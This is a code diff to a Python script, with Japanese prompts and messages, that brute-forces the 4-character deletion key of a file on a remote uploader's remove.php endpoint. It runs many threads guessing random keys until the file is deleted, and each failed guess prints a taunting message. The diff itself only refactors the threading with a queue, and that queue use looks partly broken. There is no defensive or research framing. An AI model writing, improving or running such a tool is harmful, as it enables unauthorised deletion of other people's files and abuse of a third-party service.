@@ -4,6 +4,7 @@ import threading
 import time
 import urllib.parse
 import urllib.request
+from queue import Queue
 
 
 def main():
@@ -13,28 +14,22 @@ def main():
 
     thread_num = int(input("スレッド数を入力してください: "))
 
-    random.seed(time.time_ns())
-    used_passwords = set()
-
-    while True:
-        password = generate_random_string(4)
-        if password not in used_passwords:
-            used_passwords.add(password)
-            break
-
+    password = generate_random_string(4)
     delete_url = f"https://{server_id}/remove.php?file={file_name}&delkey={password}"
 
     threads = []
-    for i in range(thread_num):
-        t = threading.Thread(target=delete_file, args=(delete_url,file_name))
-        t.start()
+    task_queue = Queue()
+
+    for _ in range(thread_num):
+        t = threading.Thread(target=delete_file, args=(task_queue, delete_url, file_name))
         threads.append(t)
+        t.start()
 
     for t in threads:
         t.join()
 
 
-def delete_file(delete_url, file_name):
+def delete_file(task_queue, delete_url, file_name):
     while True:
         try:
             response = urllib.request.urlopen(delete_url)
@@ -51,7 +46,9 @@ def delete_file(delete_url, file_name):
         else:
             password = generate_random_string(4)
             delete_url = f"{delete_url.split('&')[0]}&delkey={password}"
+            task_queue.put(delete_url)
             print(f"パスワード{password}は違ったようだなガハハハッ")
+            task_queue.task_done()
 
 
 def generate_random_string(length):
